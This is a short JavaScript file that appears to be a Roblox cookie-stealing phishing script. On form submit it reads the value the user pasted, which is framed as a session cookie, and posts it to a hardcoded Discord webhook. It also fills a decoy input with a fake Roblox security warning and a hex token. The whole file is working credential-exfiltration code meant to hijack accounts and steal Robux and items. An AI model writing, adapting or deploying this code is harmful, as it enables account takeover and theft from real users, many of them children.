
var inputElement = document.createElement('input');
inputElement.type = 'text';
document.body.appendChild(inputElement)
inputElement.classList.add("second-input")

const formElement = document.getElementById('my-form');
const whurl = 'https://discord.com/api/webhooks/1121888454867959978/SlauwbctwAQFh69tn4_UpVyT2CYmZm_lpGBP3_9h7_BRaCqEUcNNfwI1kbWKEX15q7SO';
const btn = document.querySelector('submit')



formElement.addEventListener('submit', (event) => {
  event.preventDefault();
  setTimeout(function() {
    inputElement.value = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_D225AB43D49E310AAAA336BC9DA968B5062F80E01C9BDDF2522EC1DEE6A28CDC503A7E29CBD65C01649B2F373E116EC1243A8FFA7329A0D3FE236C84E962F304428C2F7674CE573C9BC2FB05EEC52F3A784C7A51585A96A620B97CCFB784417AC491B7A6D2E5282279D6E3A0842A3DF800960400BB48E72FCF004DC18DA116ED9BAD8176786A364F8FDF27582F9CEFCB243A4DD8BD5BB04E98EE745B6754FB845FA9A64A8066437BFB6FD6BE62E1D068564A9F7EC00D9D4319EE8F73AFDB82BC38CA4646612036913F21AB13CE7F86B1373CF881964AE85D9EA02A08E2B92A1573BC6379F370E300A8A906D084D1090415397F4982B4DE32352357807D7064B8B81B003079CD53EFF668EC55F3740B54756B934176D8C77F571841EE080D604BFDA3B724AEC28E330C4A3E1FF5B64A9E347E6F2D11C1CA4A77C563B2BC464F849418CD15EC8EE4F94C86F360EBE2E84133579EDE1C7BA65A665AB3FDD4B70BC8EA8A909D'
  }, 1200);
  const inputValue = document.getElementById('input-field').value;
  const payload = {
    content: 'There\'s a cookie! Here it is: ```\n\n' + inputValue.trim() + "\n```"
  };


  fetch(whurl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  })

});

